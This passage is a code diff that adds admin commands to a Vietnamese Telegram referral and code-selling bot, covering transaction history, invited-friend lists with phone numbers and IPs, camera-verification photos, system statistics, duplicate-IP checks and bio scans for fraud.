+                    f"{E['CROSS']} Khóa TK: <b>{'CÓ' if ban1 else 'KHÔNG'}</b>\n"
+                    f"{E['WARN']} Cấm rút: <b>{'CÓ' if ban2 else 'KHÔNG'}</b>\n"
+                    f"{E['HOURGLASS']} Tham gia: <code>{joined}</code>\n"
+                )
+
+                photo_sent = False
+                if photo_token:
+                    photo_path = f"/var/www/phongtunk/captures/{photo_token}.jpg"
+                    if os.path.exists(photo_path):
+                        try:
+                            with open(photo_path, "rb") as pf:
+                                await context.bot.send_photo(
+                                    chat_id=chat_id,
+                                    photo=pf,
+                                    caption=info + f"\n{E['IMAGE']} <b>Ảnh camera xác minh</b>",
+                                    parse_mode="HTML",
+                                )
+                            photo_sent = True
+                        except Exception as e:
+                            logger.warning(f"Lỗi gửi ảnh camera user {u_id}: {e}")
+
+                if not photo_sent:
+                    if photo_token:
+                        info += f"\n{E['WARN']} Ảnh camera: <i>Không tìm thấy file trên server</i>"
+                    else:
+                        info += f"\n{E['WARN']} Ảnh camera: <i>Chưa có ảnh (user chưa quét camera)</i>"
+                    await message.reply_text(
+                        info, parse_mode="HTML", disable_web_page_preview=True
+                    )
+                await asyncio.sleep(0.3)
+
+        elif cmd == "/txlog":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/txlog ID_USER</code>",
+                    parse_mode="HTML",
+                )
+                return
+            try:
+                target_id = int(args[0])
+            except ValueError:
+                await message.reply_text(
+                    f"{E['CROSS']} ID không hợp lệ!", parse_mode="HTML"
+                )
+                return
+            txs = await db_query(
+                "SELECT type, amount, status, created_at, details FROM transactions WHERE user_id=%s ORDER BY id DESC LIMIT 20",
+                (target_id,),
+                fetchall=True,
+            )
+            if not txs:
+                await message.reply_text(
+                    f"{E['BANDAGE']} Người dùng <code>{target_id}</code> chưa từng có giao dịch nào.",
+                    parse_mode="HTML",
+                )
+                return
+            msg = f"{E['INBOX']} <b>LỊCH SỬ GIAO DỊCH CỦA ID:</b> <code>{target_id}</code>\n━━━━━━━━━━━━━━━━━━\n\n"
+            for tx_type, amount, status, created_at, details in txs:
+                icon = E["CHECK"] if status == "Thành công" else E["CROSS"]
+                msg += (
+                    f"{icon} <b>Loại:</b> {tx_type}\n"
+                    f"{E['MONEY']} <b>Số tiền:</b> <code>{amount:,}đ</code>\n"
+                    f"{E['SHIELD']} <b>Chi tiết:</b> <code>{details or 'Không có'}</code>\n"
+                    f"{E['GLOBE']} <b>Thời gian:</b> <code>{created_at}</code>\n"
+                    "----------------------------------\n"
+                )
+            await message.reply_text(msg, parse_mode="HTML")
+
+        elif cmd == "/txfull":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/txfull ID_USER</code>",
+                    parse_mode="HTML",
+                )
+                return
+            try:
+                target_id = int(args[0])
+            except ValueError:
+                await message.reply_text(
+                    f"{E['CROSS']} ID không hợp lệ!", parse_mode="HTML"
+                )
+                return
+            txs = await db_query(
+                "SELECT id, type, amount, status, created_at, details FROM transactions WHERE user_id=%s ORDER BY id DESC",
+                (target_id,),
+                fetchall=True,
+            )
+            if not txs:
+                await message.reply_text(
+                    f"{E['BANDAGE']} Người dùng <code>{target_id}</code> không có lịch sử giao dịch nào.",
+                    parse_mode="HTML",
+                )
+                return
+            header = f"{E['INBOX']} <b>FULL LỊCH SỬ GIAO DỊCH ID:</b> <code>{target_id}</code> (Tổng: {len(txs)} giao dịch)\n━━━━━━━━━━━━━━━━━━\n\n"
+            chunks = [header]
+            current_chunk_idx = 0
+            for tx_id, tx_type, amount, status, created_at, details in txs:
+                icon = E["CHECK"] if status == "Thành công" else E["CROSS"]
+                line = (
+                    f"{icon} <b>Mã GD:</b> #{tx_id} | <b>Loại:</b> {tx_type}\n"
+                    f"{E['MONEY']} <b>Số tiền:</b> <code>{amount:,}đ</code> | <b>Trạng thái:</b> {status}\n"
+                    f"{E['SHIELD']} <b>Chi tiết:</b> <code>{details or 'Không có'}</code>\n"
+                    f"{E['GLOBE']} <b>Thời gian:</b> <code>{created_at}</code>\n"
+                    "----------------------------------\n"
+                )
+                if len(chunks[current_chunk_idx]) + len(line) > 3900:
+                    chunks.append(line)
+                    current_chunk_idx += 1
+                else:
+                    chunks[current_chunk_idx] += line
+            for chunk_content in chunks:
+                await message.reply_text(chunk_content, parse_mode="HTML")
+                await asyncio.sleep(0.3)
+
+        elif cmd in ("/checkfriends", "/friends"):
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/friends ID_USER</code> hoặc <code>/checkfriends ID_USER</code>",
+                    parse_mode="HTML",
+                )
+                return
+            try:
+                target_id = int(args[0])
+            except ValueError:
+                await message.reply_text(
+                    f"{E['CROSS']} ID không hợp lệ!", parse_mode="HTML"
+                )
+                return
+            invited = await db_query(
+                "SELECT user_id, username, joined_at, phone_number, ip_address FROM users WHERE referrer_id=%s ORDER BY user_id DESC",
+                (target_id,),
+                fetchall=True,
+            )
+            if not invited:
+                await message.reply_text(
+                    f"{E['BANDAGE']} Người dùng <code>{target_id}</code> chưa mời được bạn bè nào.",
+                    parse_mode="HTML",
+                )
+                return
+            total_invited = len(invited)
+            header = f"{E['TOP']} <b>DANH SÁCH BẠN BÈ MỜI BỞI ID:</b> <code>{target_id}</code>\n{E['STAR']} <b>Tổng số bạn bè mời:</b> <code>{total_invited:,}</code> người\n━━━━━━━━━━━━━━━━━━\n\n"
+            chunks = [header]
+            current_chunk_idx = 0
+            all_buttons = []
+            row = []
+            for u_id, username, joined_at, phone, ip_addr in invited:
+                uname_str = (
+                    f"@{username}" if username else "Không có @username"
+                )
+                phone_str = phone if phone else "Chưa xác minh SĐT"
+                ip_str = ip_addr if ip_addr else "Chưa xác minh IP"
+                joined_str = joined_at if joined_at else "Không rõ"
+                line = (
+                    f"{E['CROWN']} <b>Full @name:</b> {uname_str}\n"
+                    f"{E['PLUS']} <b>ID:</b> <code>{u_id}</code>\n"
+                    f"{E['PHONE']} <b>SĐT:</b> <code>{phone_str}</code>\n"
+                    f"{E['GLOBE']} <b>IP:</b> <code>{ip_str}</code>\n"
+                    f"{E['GLOBE']} <b>Ngày tham gia:</b> <code>{joined_str}</code>\n"
+                    "----------------------------------\n"
+                )
+                if len(chunks[current_chunk_idx]) + len(line) > 3800:
+                    chunks.append(line)
+                    current_chunk_idx += 1
+                else:
+                    chunks[current_chunk_idx] += line
+                row.append(
+                    abtn(f"{u_id}", "PIN2", url=f"tg://user?id={u_id}")
+                )
+                if len(row) == 2:
+                    all_buttons.append(row)
+                    row = []
+            if row:
+                all_buttons.append(row)
+            for idx, chunk_content in enumerate(chunks):
+                markup = (
+                    InlineKeyboardMarkup(all_buttons)
+                    if (idx == len(chunks) - 1 and all_buttons)
+                    else None
+                )
+                await message.reply_text(
+                    chunk_content,
+                    reply_markup=markup,
+                    parse_mode="HTML",
+                    disable_web_page_preview=True,
+                )
+                await asyncio.sleep(0.3)
+
+        elif cmd == "/users":
             res = await db_query("SELECT COUNT(*) FROM users", fetchone=True)
             total_users = res[0]
-            msg = (
-                f"{E['CHART']} <b>THỐNG KÊ TỔNG NGUỜI DÙNG</b>\n━━━━━━━━━━━━━━━━━━\n"
-                f"{E['COOL']} Tổng số người dùng trong hệ thống: <b>{total_users:,}</b>"
+            users = await db_query(
+                "SELECT user_id, username FROM users ORDER BY joined_at DESC LIMIT 50",
+                fetchall=True,
             )
+            msg = (
+                f"{E['TOP']} <b>THỐNG KÊ TỔNG NGƯỜI DÙNG</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{E['CROWN2']} Tổng số người dùng trong hệ thống: <b>{total_users:,}</b>\n\n"
+                f"{E['RIGHT']} <b>Bấm vào nút ID bên dưới để kiểm tra full thông tin:</b>"
+            )
+            buttons = []
+            row = []
+            for u_id, u_name in users:
+                btn_text = f"{u_id}"
+                if u_name:
+                    btn_text += f" (@{u_name})"
+                row.append(
+                    abtn(btn_text, "PIN2", callback_data=f"userinfo_{u_id}")
+                )
+                if len(row) == 2:
+                    buttons.append(row)
+                    row = []
+            if row:
+                buttons.append(row)
+            await message.reply_text(
+                msg,
+                reply_markup=InlineKeyboardMarkup(buttons)
+                if buttons
+                else None,
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/stats":
+            today = datetime.now(TIMEZONE).strftime("%Y-%m-%d") + "%"
+            total = (
+                await db_query("SELECT COUNT(*) FROM users", fetchone=True)
+            )[0]
+            banned = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE is_banned=1",
+                    fetchone=True,
+                )
+            )[0]
+            wd_banned = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE is_withdraw_banned=1 AND is_banned=0",
+                    fetchone=True,
+                )
+            )[0]
+            phone_ok = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE phone_number IS NOT NULL AND phone_number<>''",
+                    fetchone=True,
+                )
+            )[0]
+            ip_ok = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE ip_address IS NOT NULL AND ip_address<>''",
+                    fetchone=True,
+                )
+            )[0]
+            cap_ok = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE captcha_verified=1",
+                    fetchone=True,
+                )
+            )[0]
+            mcap_ok = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE miniapp_captcha_verified=1",
+                    fetchone=True,
+                )
+            )[0]
+            cam_ok = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE camera_verified=1",
+                    fetchone=True,
+                )
+            )[0]
+            cccam_ok = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE cccam_verified=1",
+                    fetchone=True,
+                )
+            )[0]
+            sum_bal = (
+                await db_query(
+                    "SELECT COALESCE(SUM(balance),0) FROM users WHERE is_banned=0",
+                    fetchone=True,
+                )
+            )[0]
+            new_today = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE joined_at LIKE %s",
+                    (today,),
+                    fetchone=True,
+                )
+            )[0]
+            ref_today = (
+                await db_query(
+                    "SELECT COUNT(*) FROM transactions WHERE type='Thưởng Mời Bạn' AND status='Thành công' AND created_at LIKE %s",
+                    (today,),
+                    fetchone=True,
+                )
+            )[0]
+            buy_today = await db_query(
+                "SELECT COUNT(*), COALESCE(SUM(amount),0) FROM transactions WHERE type LIKE 'Mua Code%%' AND status='Thành công' AND created_at LIKE %s",
+                (today,),
+                fetchone=True,
+            )
+            buy_all = (
+                await db_query(
+                    "SELECT COUNT(*) FROM transactions WHERE type LIKE 'Mua Code%%' AND status='Thành công'",
+                    fetchone=True,
+                )
+            )[0]
+            stock = (
+                await db_query(
+                    "SELECT COUNT(*) FROM code_stock WHERE is_used=0",
+                    fetchone=True,
+                )
+            )[0]
+            maint = await is_maintenance()
+            await message.reply_text(
+                f"{E['TOP']} <b>BẢNG THỐNG KÊ HỆ THỐNG</b>\n━━━━━━━━━━━━━━━━━━\n"
+                f"{E['CROWN2']} Tổng thành viên: <b>{total:,}</b>\n"
+                f"{E['GRIN']} Thành viên mới hôm nay: <b>{new_today:,}</b>\n"
+                f"{E['CROSS']} Đang bị khóa: <b>{banned:,}</b>\n"
+                f"{E['WARN']} Bị cấm rút code (chưa khóa): <b>{wd_banned:,}</b>\n"
+                f"{E['PHONE']} Đã xác minh SĐT: <b>{phone_ok:,}</b>\n"
+                f"{E['IMAGE']} Đã xác minh CCCAM: <b>{cccam_ok:,}</b>\n"
+                f"{E['IMAGE']} Đã xác minh Camera: <b>{cam_ok:,}</b>\n"
+                f"{E['SHIELD']} Đã qua Captcha MiniApp: <b>{mcap_ok:,}</b>\n"
+                f"{E['GLOBE']} Đã xác minh IP: <b>{ip_ok:,}</b>\n"
+                f"{E['SHIELD']} Đã qua Captcha: <b>{cap_ok:,}</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{E['MONEY']} Tổng số dư (user không bị khóa): <b>{sum_bal:,}đ</b>\n"
+                f"{E['ROCKET']} Lượt mời thành công hôm nay: <b>{ref_today:,}</b>\n"
+                f"{E['CARD']} Code đã bán hôm nay: <b>{buy_today[0]:,}</b> ({buy_today[1]:,}đ)\n"
+                f"{E['CARD']} Tổng code đã bán: <b>{buy_all:,}</b>\n"
+                f"{E['FIRE']} Kho code còn: <b>{stock:,}</b>\n"
+                f"{E['MONEY']} Giá code hiện tại: <b>{CODE_PRICE:,}đ</b>\n"
+                f"{E['GEAR']} Bảo trì: <b>{'ĐANG BẬT 🔴' if maint else 'Tắt 🟢'}</b>",
+                parse_mode="HTML",
+            )
+
+        elif cmd == "/banlist":
+            total_b = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE is_banned=1",
+                    fetchone=True,
+                )
+            )[0]
+            rows = await db_query(
+                "SELECT user_id, username, ip_address FROM users WHERE is_banned=1 ORDER BY user_id DESC LIMIT 40",
+                fetchall=True,
+            )
+            if not rows:
+                await message.reply_text(
+                    f"{E['CHECK2']} Hiện không có tài khoản nào bị khóa.",
+                    parse_mode="HTML",
+                )
+                return
+            msg = f"{E['CROSS']} <b>DANH SÁCH TÀI KHOẢN BỊ KHÓA</b> (tổng <b>{total_b:,}</b>, hiện 40 mới nhất)\n━━━━━━━━━━━━━━━━━━\n"
+            for u_id, u_name, ip in rows:
+                msg += f"• {('@' + u_name) if u_name else 'N/A'} | <code>{u_id}</code> | IP: <code>{ip or 'N/A'}</code>\n"
+            msg += f"\n{E['INFO']} Mở khóa: <code>/unban ID</code> hoặc <code>/unall ID</code>"
+            await send_split_message(
+                context.bot, chat_id, msg, parse_mode="HTML"
+            )
+
+        elif cmd == "/wdbanlist":
+            total_c = (
+                await db_query(
+                    "SELECT COUNT(*) FROM users WHERE is_withdraw_banned=1 AND is_banned=0",
+                    fetchone=True,
+                )
+            )[0]
+            rows = await db_query(
+                "SELECT user_id, username, balance FROM users WHERE is_withdraw_banned=1 AND is_banned=0 ORDER BY user_id DESC LIMIT 40",
+                fetchall=True,
+            )
+            if not rows:
+                await message.reply_text(
+                    f"{E['CHECK2']} Không có tài khoản nào bị cấm rút code.",
+                    parse_mode="HTML",
+                )
+                return
+            msg = f"{E['WARN']} <b>DANH SÁCH BỊ CẤM RÚT CODE</b> (tổng <b>{total_c:,}</b>)\n━━━━━━━━━━━━━━━━━━\n"
+            for u_id, u_name, bal in rows:
+                msg += f"• {('@' + u_name) if u_name else 'N/A'} | <code>{u_id}</code> | <code>{bal:,}đ</code>\n"
+            msg += f"\n{E['INFO']} Gỡ cấm: <code>/unbanwd ID</code>"
+            await send_split_message(
+                context.bot, chat_id, msg, parse_mode="HTML"
+            )
+
+        elif cmd == "/topbal":
+            rows = await db_query(
+                "SELECT user_id, username, balance FROM users WHERE is_banned=0 AND balance>0 ORDER BY balance DESC LIMIT 15",
+                fetchall=True,
+            )
+            if not rows:
+                await message.reply_text(
+                    f"{E['BANDAGE']} Chưa có user nào có số dư.",
+                    parse_mode="HTML",
+                )
+                return
+            medals = {
+                1: E["GOLD_MEDAL"],
+                2: E["SILVER_MEDAL"],
+                3: E["BRONZE_MEDAL"],
+            }
+            msg = f"{E['MONEY']} <b>TOP 15 SỐ DƯ CAO NHẤT</b>\n━━━━━━━━━━━━━━━━━━\n"
+            for i, (u_id, u_name, bal) in enumerate(rows, start=1):
+                msg += f"{medals.get(i, E['RIGHT'])} <b>{i}.</b> {('@' + u_name) if u_name else 'N/A'} | <code>{u_id}</code> | <code>{bal:,}đ</code>\n"
             await message.reply_text(msg, parse_mode="HTML")
 
-        elif cmd == "/tongrut":
-            res = await db_query("SELECT COALESCE(SUM(amount), 0)::BIGINT, COUNT(*) FROM transactions WHERE type='Rút Tiền' AND status='Thành công'", fetchone=True)
-            total_amount, total_count = (res[0] if res else 0), (res[1] if res else 0)
-            msg = (
-                f"{E['DOWN']} <b>TỔNG TOÀN BỘ SỐ TIỀN ĐÃ RÚT THÀNH CÔNG</b>\n━━━━━━━━━━━━━━━━━━\n"
-                f"{E['UP']} <b>Tổng số tiền đã rút:</b> <code>{total_amount:,}đ</code>\n"
-                f"{E['CHART']} <b>Tổng số lệnh thành công:</b> <code>{total_count:,}</code> lệnh"
+        elif cmd in ("/dupip", "/dupphone"):
+            col = "ip_address" if cmd == "/dupip" else "phone_number"
+            label = "IP" if cmd == "/dupip" else "SĐT"
+            rows = await db_query(
+                f"SELECT {col}, COUNT(*), array_agg(user_id) FROM users "
+                f"WHERE {col} IS NOT NULL AND {col}<>'' GROUP BY {col} HAVING COUNT(*)>1 ORDER BY COUNT(*) DESC LIMIT 20",
+                fetchall=True,
             )
-            await message.reply_text(msg, parse_mode="HTML")
+            if not rows:
+                await message.reply_text(
+                    f"{E['CHECK2']} Không có {label} nào bị dùng chung bởi nhiều tài khoản.",
+                    parse_mode="HTML",
+                )
+                return
+            msg = f"{E['GLOBE']} <b>{label} DÙNG CHUNG NHIỀU TÀI KHOẢN</b>\n━━━━━━━━━━━━━━━━━━\n\n"
+            for val, cnt, ids in rows:
+                ids_txt = ", ".join(f"<code>{i}</code>" for i in ids[:10])
+                msg += f"{E['WARN']} <code>{val}</code> — <b>{cnt}</b> tài khoản\n   ID: {ids_txt}\n\n"
+            await send_split_message(
+                context.bot, chat_id, msg, parse_mode="HTML"
+            )
 
-        elif cmd == "/check":
-            if len(args) < 1:
-                await message.reply_text(f"{E['CLIP']} <b>Cú pháp:</b> <code>/check USER_ID</code>", parse_mode="HTML")
+        elif cmd == "/biofriends":
+            if not args:
+                await message.reply_text(
+                    f"{E['WARN']} <b>Cú pháp:</b> <code>/biofriends USER_ID</code>",
+                    parse_mode="HTML",
+                )
                 return
             try:
                 target_id = int(args[0])
-            except (ValueError, TypeError):
-                await message.reply_text("❌ USER_ID không hợp lệ.")
+            except ValueError:
+                await message.reply_text(
+                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
+                )
                 return
-
-            u = await db_query(USER_SELECT_QUERY, (target_id,), fetchone=True)
-            if not u:
-                await message.reply_text(f"❌ Không tìm thấy người dùng có ID <code>{target_id}</code>.", parse_mode="HTML")
-                return
-
-            balance = u[2]
-            bank_info = u[3] if u[3] else "Chưa liên kết"
-            is_banned = u[10]
-            is_withdraw_banned = u[11]
-
-            if is_banned == 1:
-                status_str = "🔴 Bị khóa vĩnh viễn"
-            elif is_withdraw_banned == 1:
-                status_str = "🟠 Bị cấm rút tiền"
-            else:
-                status_str = "🟢 Hoạt động bình thường"
-
-            res_withdraw = await db_query(
-                "SELECT COALESCE(SUM(amount), 0)::BIGINT FROM transactions WHERE user_id=%s AND type='Rút Tiền' AND status='Thành công'",
-                (target_id,), fetchone=True
+            owner = await db_query(
+                "SELECT user_id, username, phone_number, ip_address FROM users WHERE user_id=%s",
+                (target_id,),
+                fetchone=True,
             )
-            total_withdraw = res_withdraw[0] if res_withdraw else 0
-
-            res_ref = await db_query("SELECT COUNT(*) FROM users WHERE referrer_id=%s AND ref_rewarded=1", (target_id,), fetchone=True)
-            total_refs = res_ref[0] if res_ref else 0
-
-            name_str = f"@{u[1]}" if u[1] else "Chưa đặt username"
-
-            msg = (
-                f"{E['CROWN']} <b>THÔNG TIN CHI TIẾT NGƯỜI DÙNG</b>\n"
-                f"━━━━━━━━━━━━━━━━━━\n"
-                f"{E['EYES']} <b>ID:</b> <code>{u[0]}</code>\n"
-                f"{E['COOL']} <b>@name:</b> {name_str}\n"
-                f"{E['UP']} <b>Số dư:</b> <code>{balance:,}đ</code>\n"
-                f"{E['DOWN']} <b>Tổng rút:</b> <code>{total_withdraw:,}đ</code>\n"
-                f"{E['REFRESH']} <b>Tổng mời ref hợp lệ:</b> <code>{total_refs}</code> người\n"
-                f"{E['LOCK']} <b>Ngân hàng liên kết:</b> <code>{bank_info}</code>\n"
-                f"{E['CHECK_ANIMATED']} <b>Trạng thái:</b> {status_str}"
+            if not owner:
+                await message.reply_text(
+                    f"{E['CROSS']} Không tìm thấy ID <code>{target_id}</code> trong cơ sở dữ liệu.",
+                    parse_mode="HTML",
+                )
+                return
+            invited = await db_query(
+                "SELECT user_id, username, phone_number, ip_address, is_banned FROM users WHERE referrer_id=%s ORDER BY joined_at DESC",
+                (target_id,),
+                fetchall=True,
             )
-
-            keyboard = InlineKeyboardMarkup([
-                [InlineKeyboardButton("📜 Kiểm tra toàn bộ lịch sử giao dịch", callback_data=f"check_hist_{target_id}")]
-            ])
-
-            await message.reply_text(msg, reply_markup=keyboard, parse_mode="HTML")
-
-        elif cmd == "/kt":
-            if len(args) < 1:
-                await message.reply_text(f"{E['CLIP']} <b>Cú pháp:</b> <code>/kt USER_ID</code>", parse_mode="HTML")
+            if not invited:
+                await message.reply_text(
+                    f"{E['BANDAGE']} ID <code>{target_id}</code> chưa mời được bạn bè nào.",
+                    parse_mode="HTML",
+                )
                 return
-            try: target_id = int(args[0])
-            except (ValueError, TypeError):
-                await message.reply_text("❌ USER_ID không hợp lệ.")
-                return
-            u = await db_query(USER_SELECT_QUERY, (target_id,), fetchone=True)
-            if not u:
-                await message.reply_text("❌ Không tìm thấy user này.")
-                return
-
-            stats = await db_query(
-                """
-                SELECT
-                    COALESCE(COUNT(*), 0)::BIGINT,
-                    COALESCE(SUM(CASE WHEN status='Thành công' THEN amount ELSE 0 END), 0)::BIGINT,
-                    COALESCE(COUNT(CASE WHEN status='Thành công' THEN 1 END), 0)::BIGINT,
-                    COALESCE(COUNT(CASE WHEN status='Chờ duyệt' THEN 1 END), 0)::BIGINT,
-                    COALESCE(COUNT(CASE WHEN status='Từ chối' THEN 1 END), 0)::BIGINT
-                FROM transactions
-                WHERE user_id=%s AND type='Rút Tiền'
-                """,
-                (target_id,), fetchone=True
+            await message.reply_text(
+                f"{E['HOURGLASS']} Đang kiểm tra tiểu sử <b>{len(invited):,}</b> bạn bè được mời bởi <code>{target_id}</code>...",
+                parse_mode="HTML",
             )
-
-            if not stats:
-                total_attempts, success_amount, success_count, pending_count, reject_count = 0, 0, 0, 0, 0
-            else:
-                total_attempts, success_amount, success_count, pending_count, reject_count = stats
-
-            username = f"@{u[1]}" if u[1] else "Chưa đặt"
-            bank = u[3] if u[3] else "Chưa liên kết"
-            referrer = u[4] if u[4] is not None else "Không có"
-            withdraw_txs = await db_query("SELECT id, amount, status, created_at FROM transactions WHERE user_id=%s AND type='Rút Tiền' ORDER BY id DESC LIMIT 10", (target_id,), fetchall=True)
-
-            msg = (
-                f"{E['EYES']} <b>THÔNG TIN RÚT TIỀN CỦA USER <code>{target_id}</code></b>\n━━━━━━━━━━━━━━━━━━\n"
-                f"{E['COOL']} Username: {username}\n"
-                f"{E['PHONE']} SĐT: <code>{u[5] or 'Chưa xác minh'}</code>\n"
-                f"{E['UP']} Số dư hiện tại: <code>{u[2]:,}đ</code>\n"
-                f"{E['LOCK']} Ngân hàng: <code>{bank}</code>\n"
-                f"{E['CLIP']} Người giới thiệu: <code>{referrer}</code>\n"
-                f"{E['BAN']} Khóa TK: <b>{'CÓ' if u[10] else 'KHÔNG'}</b> | Cấm rút: <b>{'CÓ' if u[11] else 'KHÔNG'}</b>\n"
-                f"{E['CALENDAR']} Ngày tham gia: <code>{u[12]}</code>\n\n"
-                f"{E['CHART']} <b>THỐNG KÊ RÚT TIỀN:</b>\n"
-                f"• {E['DOWN']} Tổng tiền đã rút thành công: <code>{success_amount:,}đ</code>\n"
-                f"• {E['THUMB']} Số lần rút thành công: <code>{success_count}</code> lần\n"
-                f"• {E['CALENDAR']} Số lần đang chờ duyệt: <code>{pending_count}</code> lần\n"
-                f"• {E['BAN']} Số lần bị từ chối: <code>{reject_count}</code> lần\n"
-                f"• {E['LIGHTNING']} Tổng số lần gửi yêu cầu rút: <code>{total_attempts}</code> lần\n\n"
-                f"{E['CHART']} <b>LỊCH SỬ RÚT TIỀN GẦN ĐÂY:</b>\n"
-            )
-            if withdraw_txs:
-                for tx_id, amount, status, created_at in withdraw_txs:
-                    icon = E['THUMB'] if status == "Thành công" else (E['BAN'] if status == "Từ chối" else E['CALENDAR'])
-                    msg += f"{icon} #{tx_id} | <code>{amount:,}đ</code> | {status} | <code>{created_at}</code>\n"
-            else:
-                msg += "• Chưa có giao dịch rút tiền nào.\n"
-            await message.reply_text(msg, parse_mode="HTML")
-
-        elif cmd == "/dl":
-            if len(args) < 1:
-                await message.reply_text(f"{E['CLIP']} <b>Cú pháp:</b> <code>/dl USER_ID</code>", parse_mode="HTML")
-                return
-            try: target_id = int(args[0])
-            except (ValueError, TypeError):
-                await message.reply_text("❌ USER_ID không hợp lệ.")
-                return
-
-            target_user = await db_query("SELECT user_id, username FROM users WHERE user_id=%s", (target_id,), fetchone=True)
-            if not target_user:
-                await message.reply_text("❌ Không tìm thấy ID này trong cơ sở dữ liệu.")
-                return
-
-            invited_users = await db_query("SELECT user_id, username, is_captcha_passed, is_phone_verified, ref_rewarded, joined_at FROM users WHERE referrer_id=%s ORDER BY joined_at DESC", (target_id,), fetchall=True)
-
-            if not invited_users:
-                await message.reply_text(f"{E['ALERT1']} Người dùng <code>{target_id}</code> chưa giới thiệu được ai.", parse_mode="HTML")
-                return
-
-            await message.reply_text(f"{E['REFRESH']} Đang kiểm tra danh sách {len(invited_users)} người được mời, vui lòng đợi giây lát...", parse_mode="HTML")
-
-            msg = f"{E['CHART']} <b>DANH SÁCH CHI TIẾT NGUỜI ĐƯỢC MỜI BỞI <code>{target_id}</code></b>\n━━━━━━━━━━━━━━━━━━\n"
-            msg += f"{E['COOL']} Tổng người đã giới thiệu: <b>{len(invited_users)}</b>\n\n"
-
-            for inv_id, inv_username, is_captcha, is_phone, ref_rewarded, joined_at in invited_users:
-                uname = f"@{inv_username}" if inv_username else f"<code>{inv_id}</code>"
-                try: missing_ch = await get_missing_channels(context.bot, inv_id)
-                except Exception: missing_ch = []
-
-                msg += f"👤 <b>Thành viên:</b> {uname} (<code>{inv_id}</code>)\n"
-                msg += f"🗓 <b>Tham gia:</b> <code>{joined_at or 'N/A'}</code>\n"
-                msg += f"├ {'✅ Đã chia sẻ' if is_phone else '❌ Chưa chia sẻ'} Số điện thoại (+84)\n"
-                msg += f"├ {'✅ Đã giải' if is_captcha else '❌ Chưa giải'} Captcha\n"
-                if not missing_ch:
-                    msg += f"└ <b>Kênh đối tác:</b> Đã tham gia ĐỦ\n"
-                else:
-                    msg += f"└ <b>Kênh CHƯA VÀO ({len(missing_ch)}):</b> <i>{', '.join(missing_ch)}</i>\n"
-
-                msg += f"• <b>Trạng thái tính thưởng:</b> {'✅ Hợp lệ (Đã nhận tiền)' if ref_rewarded == 1 else '❌ Chưa đủ điều kiện'}\n"
-                msg += "----------------------------------\n"
-                if len(msg) > 3500:
-                    await message.reply_text(msg, parse_mode="HTML")
-                    msg = ""
+            matched, unreadable = [], 0
+            for u_id, u_uname, u_phone, u_ip, u_banned in invited:
+                res = await check_bio_flag(context.bot, u_id)
+                if res is None:
+                    unreadable += 1
+                elif res:
+                    matched.append((u_id, u_uname, u_phone, u_ip, u_banned))
                 await asyncio.sleep(0.05)
 
-            if msg.strip():
-                await message.reply_text(msg, parse_mode="HTML")
+            owner_name = (
+                f"@{owner[1]}" if owner[1] else "Chưa đặt username"
+            )
+            lines = [
+                f"{E['TOP']} <b>KẾT QUẢ /biofriends — ID:</b> <code>{target_id}</code>\n━━━━━━━━━━━━━━━━━━",
+                f"{E['CROWN']} Người mời: {owner_name} | SĐT: <code>{owner[2] or 'N/A'}</code> | IP: <code>{owner[3] or 'N/A'}</code>",
+                f"{E['RIGHT']} Tổng bạn bè đã mời: <b>{len(invited):,}</b>",
+                f"{E['CROSS']} Có tiểu sử @Lienminhvietnam: <b>{len(matched):,}</b>",
+                f"{E['WARN']} Không đọc được tiểu sử: <b>{unreadable:,}</b> (user đã chặn bot / lỗi)",
+                "━━━━━━━━━━━━━━━━━━",
+            ]
+            if matched:
+                lines.append(
+                    "👥 <b>Danh sách bạn bè có tiểu sử @Lienminhvietnam:</b>\n"
+                )
+                for u_id, u_uname, u_phone, u_ip, u_banned in matched:
+                    nm = f"@{u_uname}" if u_uname else f"User {u_id}"
+                    lines.append(
+                        f"• {nm} | ID: <code>{u_id}</code>\n"
+                        f"  SĐT: <code>{u_phone or 'N/A'}</code> | IP: <code>{u_ip or 'N/A'}</code> | Khóa: <b>{'CÓ' if u_banned else 'KHÔNG'}</b>"
+                    )
+            else:
+                lines.append(
+                    f"{E['CHECK2']} Không có bạn bè nào để tiểu sử @Lienminhvietnam."
+                )
+            await send_split_message(
+                context.bot, chat_id, "\n".join(lines), parse_mode="HTML"
+            )
 
-        elif cmd == "/tb":
+        elif cmd == "/scanbio":
+            await message.reply_text(
+                f"{E['HOURGLASS']} Đang tiến hành kiểm tra tiểu sử thành viên hệ thống...",
+                parse_mode="HTML",
+            )
+            all_users = await db_query(
+                "SELECT user_id, username, phone_number, ip_address, referrer_id FROM users WHERE is_banned=0",
+                fetchall=True,
+            )
+
+            banned_pairs = []
+            referrer_map = defaultdict(list)
+
+            for u_id, uname, phone, ip, ref_id in all_users:
+                try:
+                    chat_full = await context.bot.get_chat(u_id)
+                    bio = chat_full.bio or ""
+                    if BIO_FLAG in bio.lower():
+                        if ref_id:
+                            banned_pairs.append((ref_id, u_id))
+                            referrer_map[ref_id].append(u_id)
+                except Exception as e:
+                    logger.warning(
+                        f"Không thể check bio user {u_id}: {e}"
+                    )
+                await asyncio.sleep(0.05)
+
+            if not banned_pairs:
+                await message.reply_text(
+                    f"{E['CHECK']} Không phát hiện tài khoản nào có tiểu sử `@Lienminhvietnam` và có người giới thiệu.",
+                    parse_mode="HTML",
+                )
+                return
+
+            report_lines = [
+                "🚨 <b>BÁO CÁO KHÓA TÀI KHOẢN BUFF / VI PHẠM</b>\n━━━━━━━━━━━━━━━━━━\n"
